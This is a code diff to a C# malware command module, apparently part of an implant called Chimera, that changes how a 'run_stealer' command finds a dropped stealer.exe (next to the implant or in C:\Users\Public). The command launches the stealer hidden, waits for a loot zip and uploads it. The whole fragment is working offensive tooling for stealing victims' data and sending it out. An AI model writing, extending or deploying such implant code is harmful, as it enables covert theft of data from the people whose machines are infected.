@@ -10,8 +10,17 @@ namespace Chimera.Commands
     // run_stealer                        — launch stealer.exe from staging dir, wait for loot zip, upload it
     public static class InjectAssembly
     {
-        private static readonly string LootPath   = Path.Combine(Staging.Dir, "stealer_loot.zip");
-        private static readonly string StealerExe = Path.Combine(Staging.Dir, "stealer.exe");
+        private static readonly string LootPath = Path.Combine(Staging.Dir, "stealer_loot.zip");
+
+        // stealer.exe is dropped by the DLL alongside chimera.exe.
+        // Look next to the running exe first, fall back to C:\Users\Public.
+        private static string GetStealerPath()
+        {
+            string dir = Path.GetDirectoryName(
+                System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
+            string beside = Path.Combine(dir, "stealer.exe");
+            return File.Exists(beside) ? beside : @"C:\Users\Public\stealer.exe";
+        }
         private const int PollSec = 120;
 
         public static string Execute(string parameters, string taskID, string callbackUUID)
@@ -79,16 +88,17 @@ namespace Chimera.Commands
             {
                 Staging.EnsureDir();
 
+                string StealerExe = GetStealerPath();
                 if (!File.Exists(StealerExe))
                     return "[error] stealer.exe not found at " + StealerExe;
 
                 // Delete any stale loot zip before we start
                 try { if (File.Exists(LootPath)) File.Delete(LootPath); } catch { }
 
-                // Launch stealer.exe hidden, from the staging directory
+                // Launch stealer.exe hidden, from its own directory
                 var psi = new ProcessStartInfo(StealerExe)
                 {
-                    WorkingDirectory = Staging.Dir,
+                    WorkingDirectory = Path.GetDirectoryName(StealerExe),
                     UseShellExecute  = false,
                     CreateNoWindow   = true,
                     WindowStyle      = ProcessWindowStyle.Hidden
@@ -131,7 +141,7 @@ namespace Chimera.Commands
                 }
 
                 return "[+] Stealer completed.\n" +
-                       "    Exe: " + StealerExe + "\n" +
+                       "    Exe:  " + StealerExe + "\n" +
                        "    Loot uploaded: " + uploadResult;
             }
             catch (Exception ex)
